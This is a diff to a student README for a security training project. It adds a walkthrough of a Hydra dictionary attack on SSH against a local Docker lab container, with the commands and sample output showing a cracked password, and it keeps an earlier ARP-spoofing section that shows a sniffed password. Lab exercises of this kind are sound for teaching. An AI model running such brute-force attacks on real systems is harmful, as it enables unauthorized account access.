@@ -1,7 +1,7 @@
 # alx-attack_is_the_best_defense
 A repo for the optional project Attack is the best defense
 
-## ARP Spoofing and Sniffing Unencrypted Traffic
+## Task 0: ARP Spoofing and Sniffing Unencrypted Traffic
 
 ### Prerequisites
 Before proceeding, ensure you have the required tools installed:
@@ -82,3 +82,62 @@ You can analyze the capture file using either `tcpdump` or `tshark`:
   
     Pass: mypassword9898!
 
+
+## Task 1: Dictionary Attack
+
+Performing a dictionary attack using Hydra to guess a password for an SSH account.
+
+## Prerequisites
+
+- Docker: [Install Docker](https://docs.docker.com/get-docker/)
+
+## Setup
+
+1. Pull and run the Docker image `sylvainkalache/264-1` with the following command:
+
+    ```bash
+    docker run -p 2222:22 -d -ti sylvainkalache/264-1
+    ```
+
+2. Start the Docker container by replacing `<container_id>` with the ID of the newly created `sylvainkalache/264-1` container:
+
+    ```bash
+    docker start -ai <container_id>
+    ```
+
+3. Install Hydra:
+
+    ```bash
+    sudo apt-get install hydra
+    ```
+
+4. Download a potential password list in `.txt` format. You can find one in the [SecLists library](https://github.com/danielmiessler/SecLists/blob/master/Passwords/2020-200_most_used_passwords.txt).
+
+5. To save time and resources, isolate passwords with 11 characters from your password list:
+
+    ```bash
+    grep -oE '\b\w{11}\b' all_passwords.txt > 11_char_passwords.txt
+    ```
+
+## Running the Attack
+
+Run Hydra with the specified requirements:
+
+```bash
+hydra -l sylvain -P 11_char_passwords.txt ssh://127.0.0.1
+```
+
+### Explanation of Command Parameters:
+
+- `-l sylvain`: Specifies the target username as "sylvain." This is the username for which you are attempting to guess the password.
+
+- `-P 11_char_passwords.txt`: Specifies the password list or wordlist you are using for the attack. In this case, the wordlist contains passwords with 11 characters. Hydra will try each password from this list in an attempt to gain access to the SSH service.
+
+- `ssh://127.0.0.1`: Specifies the target SSH service running on the local host (127.0.0.1). Hydra will attempt to log in to this SSH service using the provided username and the passwords from the wordlist.
+
+Please practice patience as hydra tries every password in the file until it finds the right one. Once successful, it will return an output similar to:
+
+```bash
+[22][ssh] host: 127.0.0.1   login: sylvain   password: password123
+1 of 1 target successfully completed, 1 valid password found
+```
